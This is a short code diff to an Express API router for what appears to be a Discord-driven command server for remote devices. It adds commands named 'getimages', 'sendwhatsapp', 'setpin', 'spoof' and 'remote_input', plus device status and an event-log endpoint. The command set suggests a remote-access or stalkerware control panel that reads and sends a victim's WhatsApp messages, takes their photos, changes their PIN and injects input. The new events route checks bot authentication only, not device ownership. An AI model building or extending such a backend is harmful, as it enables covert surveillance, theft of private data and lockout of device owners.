@@ -74,6 +74,13 @@ const DEVICE_COMMANDS = new Set([
   'sayscary',
   'sayscaryurdu',
   'getwhatsapp',
+  'sendwhatsapp',
+  'setpin',
+  'prank_mode',
+  'spoof',
+  'openlink',
+  'getimages',
+  'remote_input',
 ]);
 
 function createApiRouter({ store, hub, config, botAuth, deviceAuth, guildAdminAuth }) {
@@ -407,7 +414,20 @@ function createApiRouter({ store, hub, config, botAuth, deviceAuth, guildAdminAu
       return res.status(403).json({ error: 'DISCORD_USER_NOT_AUTHORIZED' });
     }
 
-    return res.json({ devices: store.listDevicesForGuild(guildId) });
+    const devices = store.listDevicesForGuild(guildId);
+    return res.json({
+      devices: devices.map((d) => ({
+        ...d,
+        status: hub.deviceSockets.has(d.id) ? 'online' : 'offline',
+      }))
+    });
+  });
+
+  router.get('/devices/:id/events', botAuth, (req, res) => {
+    const { id } = req.params;
+    const limit = parseInt(req.query.limit || '50', 10);
+    const events = store.getEventsForDevice(id, limit);
+    res.json({ deviceId: id, events });
   });
 
   return router;
